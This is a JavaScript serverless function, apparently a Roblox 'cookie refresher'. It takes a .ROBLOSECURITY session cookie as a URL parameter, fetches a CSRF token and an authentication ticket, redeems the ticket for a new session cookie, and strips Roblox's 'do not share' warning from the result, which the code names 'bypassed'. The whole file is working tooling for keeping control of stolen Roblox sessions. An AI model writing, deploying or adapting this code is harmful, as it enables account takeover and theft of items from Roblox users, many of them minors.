const axios = require('axios');

// Helper function to simulate preg_match behavior
function pregMatch(regex, str) {
    const matches = str.match(regex);
    return matches ? matches[1] : null;
}

async function csrf(cookie) {
    try {
        const response = await axios({
            method: 'POST',
            url: 'https://auth.roblox.com/v2/login',
            data: '{}',
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'Content-Type': 'application/json'
            },
            maxRedirects: 0,
            validateStatus: () => true
        });

        if (response.status === 429) {
            return 'ratelimited';
        }

        const csrfToken = pregMatch(/X-CSRF-TOKEN:\s*(\S+)/i, response.headers['x-csrf-token'] || '');
        return csrfToken || null;
    } catch (error) {
        throw new Error(error.message);
    }
}

async function refresh(cookie) {
    const csrfToken = await csrf(cookie);
    if (csrfToken === 'ratelimited') {
        return 'ratelimited';
    }

    try {
        const ticketResponse = await axios({
            method: 'POST',
            url: 'https://auth.roblox.com/v1/authentication-ticket',
            data: '{}',
            headers: {
                'Origin': 'https://www.roblox.com',
                'Referer': 'https://www.roblox.com/games/920587237/Adopt-Me',
                'x-csrf-token': csrfToken,
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'Content-Type': 'application/json'
            },
            maxRedirects: 0,
            validateStatus: () => true
        });

        if (ticketResponse.status === 429) {
            return 'ratelimited';
        }

        const authTicket = pregMatch(/rbx-authentication-ticket:\s*([^\s]+)/i, ticketResponse.headers['rbx-authentication-ticket'] || '');

        const redeemResponse = await axios({
            method: 'POST',
            url: 'https://auth.roblox.com/v1/authentication-ticket/redeem',
            data: JSON.stringify({ authenticationTicket: authTicket }),
            headers: {
                'Content-Type': 'application/json',
                'Origin': 'https://www.roblox.com',
                'Referer': 'https://www.roblox.com/games/920587237/Adopt-Me',
                'x-csrf-token': csrfToken,
                'RBXAuthenticationNegotiation': '1'
            },
            maxRedirects: 0,
            validateStatus: () => true
        });

        if (redeemResponse.status === 429) {
            return 'ratelimited';
        }

        const output = redeemResponse.headers['set-cookie'] ? redeemResponse.headers['set-cookie'].join(';') : '';
        if (!output.includes('.ROBLOSECURITY=')) {
            return 'invalid cookie';
        }

        const bypassed = output.split('.ROBLOSECURITY=')[1].split(';')[0];
        const newCookie = bypassed.replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '');

        return newCookie.length === 0 ? 'invalid cookie' : newCookie;
    } catch (error) {
        throw new Error(error.message);
    }
}

// Vercel Serverless Function handler
module.exports = async (req, res) => {
    const cookie = req.query.cookie;

    if (!cookie) {
        res.status(400).json({ error: 'Missing cookie parameter' });
        return;
    }

    try {
        const refreshedCookie = await refresh(cookie);
        if (refreshedCookie === 'ratelimited') {
            res.status(429).json({ error: 'Rate limited by Roblox' });
            return;
        }
        if (refreshedCookie === 'invalid cookie') {
            res.status(400).json({ error: 'Invalid cookie provided' });
            return;
        }
        res.status(200).json({ cookie: refreshedCookie });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
};
